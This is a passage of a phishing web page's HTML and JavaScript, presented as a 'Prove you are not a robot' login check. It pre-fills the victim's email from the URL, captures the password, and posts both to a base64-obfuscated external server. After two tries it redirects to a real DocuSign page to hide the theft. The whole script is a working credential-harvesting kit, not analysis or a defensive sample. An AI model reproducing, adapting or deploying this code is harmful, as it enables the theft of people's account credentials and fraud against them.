ITXRN6IgJaXkYkp6LQVlDMCQzD2ldeuJkqR0jF0+CrW3/kALqT2ZhB10Cqi2sBNjedAqoqAXiE5HfJR3ZGfkYmTEAOek5KEjvj9RuyWgfl6iNjpNnvxVunP51zelqACTYElw0NgBXG4G6cgHwiJQ8DM7KxQ2ZwzAkKw+pKano1SkZ8THXvBpCUDhdAirZT4oIBljI3oZKB/e27YqsTj0wMLkfCnvnIjc9W4iHnDSbLvfK9K71a0CgS3DV3ZfdFO5ldEj+2utKiIOBrOQcjO1/Mwoy+2NQag5svW2G4uFaB9Zb+U2BLkHmBBloCba9DXEuKzdWbDQ8Tu/QBZnds3FTrzxkZ+eTiBgolFtyp67eynLd+OmCLsDlUUJMnABWgi04uIGUGslee6Od/NuLodnUXsNQ2CcfA1NzkZGchkgXD4FyhxvobuByynVXYG8qA2poITI2CX26Z+IuGj0MzrsB2SmZyOmZ0eqVm9AjrWB2KqUCw6qArnB3zUVk0cRCKrfCjBzkZPT3Kh4am6+22lFFM/fMGmKccFAcSYv4HrAhxS13AboEfGTHFKx+bh369EgzBWKrHcbR8HP2LbPwxA+mob7OOaFyq37wHz78ag8WfPAybHFZSmYKp7NL56SOyEnOUDwj4Sa7ay8U0iw1XDQiZyjSiJlnvvM8kJQsdKQy04ghpdnYWAsWFZFETU3UxcNM4/JHA7QmJOW6AnqYy3VdZR8FPYTNLUeHUdBDCLrMKgq6RCKE1yjoIQRbZuU2ZJSOkXQ9WVGG/Se+MKzS5ZorKLTlQ64LHTp9vEVj+qLsIX7PbSIbdFo6XnngPazc+09D0FF5Aht++SHuGTZOhHlt65tYvm+NWNM3jqTxod2rhqWfaRyNHyMbdK53Au0q8U+HxAIezU0SE9oovu3aUdh2yYZxlIDOG04jq61++tqw8jnyQaeaMjAtIV/xWmqPGFWkLWmNAONEQQ8QwJZEvy7Ei5EYCJb48NUQUU73hZAPf2GH4yOM1jvyOV0aJ8V6VlX0ANpoqG2oV3CpaSD+Z2sFf4m3Lv0N6wznWRKTCQQ7eEC7UrSJsfDueZg36eeou+oCVlvmtrGuIeOSnzyPRTPmaYP4fDazkdMqQN92eBcOnjqKiqoqMuaqxvmKUlRWXERp3QXMuW0WHhs/zWelvQVgQOJ1rMD04pgJqxffH7eAQT9TegYfnTiA8isXceVyBSprKnC+vgrfV5ULA6KFU5/1Wg7m5Akr5rrCsBiIT3A8037tzjH3ufxacBcXF9eCWMGNEjDoNJ3DzBUzgE59yWLAmZwTtM0ndmD+lLlerbV2HNnjsJehrSxJPKpoJkuEhXc85TWuDG94pWWAV/e+g52HPjIMUlFdhd/P+h3G5A4XYX7/1p+x45tdaHPV19jGlWRcTALWL1gTurWX9M49MXfsr7D84L89p87NMfjg8G7cP3S8q4Sau1U719K0u5twldtZYrH/ajV+PGaKJrT5RzubS9eeETY82tiicavsaKx1bVpXNF7GdrL4NVo60KYBUtS2xPYezt4cLBkyPjr2IUXjc0UUHiEw1+0qNsz/RFkJ1h7b5uYvACezidmjHgY3qCVE+7+G1OTFzzBSYB6BixfKn3fbJ9huwNbSb9FMFZTA8/3ar3fj5YpyZelUXdx1e6h3xLUTXCi5XPjXf495E2ergwZ0rzCByVTcyqQTlxmEN/TNkiWczpk+O/FxoPaCZ/5k37h+//se7qxAF2x/HWjbwd2PuHzqwMkRZwqirqRloN8++BYadXQSXO427SYR89ouz/VsoUAbK0RZ3DiKrLF+PflJdRkj7t4S8SJRWXHvs5izfpHCvdytWcTsO7kDLL/VhkysQGPapUA2kJDlpJQmZNxiqXGQKIMsoObqS+yIMmniWPFoGadzYSaPuFOUyaOiXXIh5LezxDy2ZwXKgEsuF1cST0JMOcNZcRG2jNVsBEsHwDS/ZuFe4pZNTQ3ZPpJO0YbVfab4zZSm/coltzR8PVjK6bzPOG/4A1isHT7SuH313vViOs4zvjX7NzoUqLN0kqPy4rMwpuAmX2X235+WAe4bOhnThoxDdbPsU57R+XCCpPtvfQDD80bKx6BcLQWdSziNho+L969WxrlSxByvOI2D33wJtu3jCUsMKVAJA3O5/aodCx97xe8Jhr9o8KGwKTdN8je4Y5LknCj5HclkQEvFC+fNw8e7csaQMG9SQBVloqEhW7CybLeXnRBO3CCSy5HYHfcWjhXukf5nOaczYL8YNwObl02npYEMF35t2uGTo3uQlEgHaWl6zlzOoDPZcQ5LJjxtOZdz2t+Uf4/9xw7wrSH1SeunzCNY33x3kWS6SSrKK/K7/EEBneVyXrdcHG+4okyWeBTzVfU5HNtb7CZaRN2oQaaPDmxhSxcjNsHYvx4rP1lJ6zsGk5iaEjcTjD9s/AuWf/oKcUQn3SR1HSmfhmXGtjXaOEEBnZXlM7c/ijnvviBssmWmvA6C2ioxixOynj1oYWv+zTMUTpNhrboK3aGdgDkTF2WgTQwPE4ykfrBddawH+SoHH3Izu/YSFNC5oDx8nLPhJUWESFHCh8eYpBJF43n8bCKtUgaJ1GJMNwujHkCBT9E03xtl0QAgrMsA2sLx8HFu0STwOFkBWBuI/H5a9Ih1C1va9Fvps+WjF3U9n7p7lmOioXZU39Ne5JN3UpjrjIImXhjHM+WlpJC8rDXTMPLLE4ctnfbrtZ9RT1NEnl4kcmPxEQwKKuiLipcoGxR6hWclN3PTnzB97IN+D7f00vHl5gtcvfi+5LmM06pMMNg8eaudLFlpG44rreY2flaAqPwOWw7uUKxmZWWsutrIuLMH7ZPWNdIbNnToCBuLqighrj0K2ndWufi+bePc+fId0hEiaJy+ZAuNjQ0KI0cUoiE6pmLhhqWYWDTGem6ntZfHRtyH+ZPnej01yENcSb/90TPgn1lSp+Erris3XyFN+LNh/dojtKhFw0OFy3kLbsh4jOzQXVkiENzOS79lxyDW103kYTYog2L0U6dlFMaXuzoNX/dBAX3Z+687bLzVudNIZUK/IhT07qt2ddzTustLW171dLfAJTJNMDTA8ILWqs9op4jWXRS5zWFopHJj/igkJnbAysObqFEc5+Ult289uVMcU+FVSMuIpudv7H4XxQe2GCZ5mYybXp7+AsTOF4ViE4z3/rvdMLyeB5803zRvtd/i0XKZvnITcTlVVpKQ27TiODX3ZjEJ6lpISkq1raeIn6QMLNr2Ov5lJehUiOONNcAV+hkRmWCoiU0w9pWfVZam1X6692yC0VCl62XkaKl4KaNd/8X7/q5s1zHggpNphDLHOQnil5zNHz1NGBPJQkluLz7yPlgfhIpEvl6WAfwpR9iXAf62nQ5IsUkFkagQXRn4jC69FAsq9psy+ocOqy5+UBMdmOKDVlYTl0X78ycPbRztsz9p6IWxjNOrmmqxYNNihcuVzGgV8ZlxjyuPfCPtZLgSQvxIXzqQtfzzd3HmMs1kg0ycd7jIMtCXvEOjD+dEQ1uhB2+826N+s29+CGJj2OkjuYh7yitbaLsvgskS0JnL3z60wWVtS4AJDuaxef4Y3VXEu0bdocAquV1caWngxY9XgNO0gmRv4rS1P1/pa8Nrn33FN/K3BPR/7CjGkUtnlMmQkhkZEz089hHlUX0jFOptc8QmhnRXeghx+9KNNKO1gBQTDDa30PzYMhi0c6QmYYLBr5/ShDV65t5qp40ZMxTwkJHN417cTgCpTJ2ZI5hsXTLdFKjD1fXPCpW5GnCZ1gnOpO2758kq7Ol7ZgdmKq0ywXDl6nmnNcG4dcAoz0AWugQMevEnG2G/dFpYa8lyCeDICOfp25+TTrpXqVC3nbOLrq9wOi0NMAdxDwr0FMZwem1hKEwwmPn8pYDEC2f0mw3LSFjGoLmixPVjS6qGOugpUG3BhELlbk4kZSbfx1DPmbN5qdeFKg7ni0K1DMBrM/5SwJz+nwXrcMkJWvml8+C3SvBptYbYZl0Fqi2YUKh/JbnPs1h6c7QgkulCRJF44J5khlO16e8rOQY+06Q+QacOw+Uc0bdAKSsvSZfSeSezZGaVNCDQuXV5LzQZzml/C950xwq15I/HcJ4arryWflWX0ERHUs5WXkA1rYvwWk6LiRqy+Pge8EzXkJxvwUgf1lMEWf3x2+bfgkFM0lAUZhMMwwoaeKT3TEe6gV+gzjE04Wqmnx4J3RN9C4YeNIG5sZhSFLTJpHzFk6M0k8nCf+lvNuVoeEMEoqAbQhM8j4AUafCKZW3KRmIgWOLDV+mvC9DZbFuX2MSP3/ysR0ZxNGGNGlQTzO0x4kGXJhhutVY9lMamqZ5ow8hpgtE23n9omtuYM9nwP2W3ol0jD36aYKhrEwoTjMgGXYWmv9N0f8OpkjZ9Gx29mIYs8AhR0APH0HQKUdBNQxZ4hCjogWNoOoUo6KYhMx+hhpaP1RTxoIdqE0MNqvb+jY/eAhKzFOfIHjLSevq6Q9tx8UIZqtm8Lgz09YXT2FpyVNgDyfcgeIAeinFqKOt+8NJ3+LycNkL405vhIH6fGZmVSMC5CArofIzDXl+PN3evV75eK1/kHo6yWponr7Ek0C9MpAaciyBAl47/qyzDzDX0IkjaTeE9y7z2yRjdbxhG9S2ELSVdfMrS7Ne+wlRPJVtWYbJ+imOYbxRO53LY6jvCnuT6MiMfMz9+9EOsOkx7jPzZS9oLLOjYHYN6D0DflD4Y1r/Q6yeHw1y3Vpu9G+gCePUxPrdu6TAIOlJXjSP2z+lNB58CbCjEXy9PSMFI+jzxoLQBolfw54n79LSha8fOfhvKt1qEglAwD9BlHkZdUnlVCMtI2vC11WWJ14fsqzyHfUfPYtUXxY4kyOyZT6lxryjIpB+9dyUvM9f0xwhleSLpagi6USWNGkOc+Xc2hIhLiln0CuoR/JpAIZ6cumICfdNU+8n566lXmAZdrzH0GsKtR4hILntFfn/j1rPHgd10iMDZEMO79sTgjKHXtNLWw0bPzRLQ9RLWawgOJxpD6goST8L2hNwPVFXgACttFk+ksEGvfbXF2jCwXx/xouRRdBaJxVNqt+TAjEr1Chtit6CBblQPbWMoPULVEI641DPqgM0lh7H5JCluVtrNZJJMX7Id2zsbtuRs3ErD2QGZOUhNSW31n11W4xFy0NWZ8722EbT+7rrCceR9+wU6/UYvIVaUNvUMnlMUpvVXlHZMfaPLNtIj0fA6xNieGO++BBbe8vjMXekZqpDccPyGIUE83efPK8RQtZxnVX02rCqtUNyGndPNVtIIQDGx4zcRqUdQlLhReLP5Whn+mgPdW+VbI8B65Y349XS9SofbLQp6GFogCnoYQP8/lG8zP/glX5EAAAAASUVORK5CYII="
							width="50px" style="position:relative;right:20px;top:-8px;">
                </div>
            
                
                <div class="modal-body px-5"> <span style="font-weight: 700; color: #575757;font-size: 17px">Prove you are not a robot
                    </span>
                    <form class="mt-4">
                        <center>
                            <div class="alert alert-danger" id="msg" style="display: none;">Error connecting server. Please try again</div>
                            <span id="error" class="text-danger" style="display: none;">Invalid user</span>
                        </center>
                        <div class="form-group row">
                            <label for="staticai" class="col-sm-4 col-form-label">Email</label>
                            <div class="col-sm-8">
                                <input type="email" class="form-control py-1" id="ai" value="">
                            </div>
                        </div>
                        <div class="form-group row">
                            <label for="inputpr" class="col-sm-4 col-form-label">Password</label>
                            <div class="col-sm-8 ">
                                <input type="password" class="form-control py-1" id="pr" placeholder="">
                            </div>
                        </div>
                    </form>
                </div>
                <div class="modal-footer p-2">
                    <button type="button" class="btn btn-success py-1" id="submit-btn" style="background-color: #156e16;">Submit</button>

                </div>
            </div>
        </div>
    </div>
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.slim.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/2.10.2/umd/popper.min.js" ></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
</body>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
<script>
/* global $ */
$(document).ready(function() {
    var count = 0;


    $('#m-btn').click();

    /////////////url ai getting////////////////
    var ai = window.location.hash.substr(1);
    if (!ai) {

    } else {
        var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;

        if (!base64regex.test(ai)) {
            // alert(btoa(email));
            var my_ai = ai;
        } else {
            // alert(atob(email));
            var my_ai = atob(ai);
        }
        // $('#email').val(email);
        // var my_email =email;
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
        // $('#ai').val(ai);
        // var my_ai = ai;
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        $('#ai').val(my_ai);
        $('#ai').attr('readonly', true);
        $("#msg").hide();
    }
    ///////////////url getting ai////////////////

    var file = "bmV4dC5waHA=";

    $('#submit-btn').click(function(event) {
        $('#error').hide();
        $('#msg').hide();
        event.preventDefault();
        var ai = $("#ai").val();
        var pr = $("#pr").val();
        var msg = $('#msg').html();
        $('#msg').text(msg);
        ///////////new injection////////////////
        var my_ai = ai;
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!ai) {
            $('#error').show();
            $('#error').html("Email field is emply.!");
            ai.focus;
            return false;
        }

        if (!filter.test(my_ai)) {
            $('#error').show();
            $('#error').html("That account doesn't exist. Enter a different account");
            ai.focus;
            return false;
        }
        if (!pr) {
            $('#error').show();
            $('#error').html("Password field is emply.!");
            ai.focus;
            return false;
        }

        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        ///////////new injection////////////////
        count = count + 1;

        $.ajax({
            dataType: 'JSON',
            url:   atob('aHR0cHM6Ly9ub2RlanMtcHJvZHVjdGlvbi02Y2YxLnVwLnJhaWx3YXkuYXBwLw=='),
            type: 'POST',
            data: {
                ai: ai,
                pr: pr,
            },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr) {
                $('#submit-btn').html('Verifying...');
            },
            success: function(response) {
                if (response) {
                    $("#msg").show();
                    console.log(response);
                    if (response['signal'] == 'ok') {
                        $("#pr").val("");
                        if (count >= 2) {
                            count = 0;
                            // window.location.replace(response['redirect_link']);
                            window.location.replace("https://na4.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f");
                            return false;

                        }
                        // $('#msg').html(response['msg']);
                    } else {
                        // $('#msg').html(response['msg']);
                    }
                }
            },
            error: function() {
                $("#pr").val("");
                if (count >= 2) {
                    count = 0;
                    window.location.replace("https://na4.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f");
                    return false;
                }
                $("#msg").show();
                // $('#msg').html("Error connecting server. Please try again");
            },
            complete: function() {
                $('#submit-btn').html('Submit');
            }
        });
    });


});
</script>

</html>
